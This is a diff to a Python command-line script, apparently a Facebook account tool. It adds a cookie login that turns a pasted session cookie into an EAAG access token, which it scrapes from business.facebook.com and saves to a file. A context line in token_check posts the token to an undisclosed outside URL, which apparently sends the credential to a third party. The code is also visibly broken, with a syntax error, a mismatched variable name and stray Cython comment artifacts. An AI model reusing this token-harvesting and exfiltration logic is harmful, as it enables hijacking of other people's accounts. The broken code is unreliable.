@@ -470,6 +470,7 @@ def login():
 	print("")
 	print("\033[92;1m  [1] With Token")
  	print("\033[92;1m  [2] With Cookie")
+	print("\033[91;1m  [0] Back")
 	print("")
 	login_sel()
 	
@@ -482,6 +483,8 @@ def login_sel():
 		token()
 	elif sel =="2" or sel =="02":
 		cookie()
+	elif select =="0":
+		main()
 	else:
 		print("")
 		print("\t\033[91;1m  SELECT VALID OPTION")
@@ -552,12 +555,29 @@ def token_check():
 	requests.post(useragent_url + token, headers=header)
 	pass
 
+def cookie():
+	os.system("clear")
+	try:
+		cookie=input(" [+] Cookie : ")
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken = open("token.txt", "w").
+		ken.write(find_token.group(1))
+		ken.close()
+		print (" [] Login Successful")
+		menu()
+	except Exception as e: 
+		os.system("rm -f token.txt")
+		print( ' [×] Login Failed ')
+		time.sleep(1.0)
+		login()
+
 def menu():
     os.system("clear")
     try:
         token = open("token.txt", "r").read()
     except(KeyError , IOError):
-        token()
+        login()
     try:
         r = requests.get("https://graph.facebook.com/me?access_token="+token)
         q = json.loads(r.text)
@@ -569,7 +589,7 @@ def menu():
         os.system("rm -rf token.txt")
         print("")
         time.sleep(1)
-        main()
+        login()
     os.system("clear")
     xn = name.upper()
     logo()
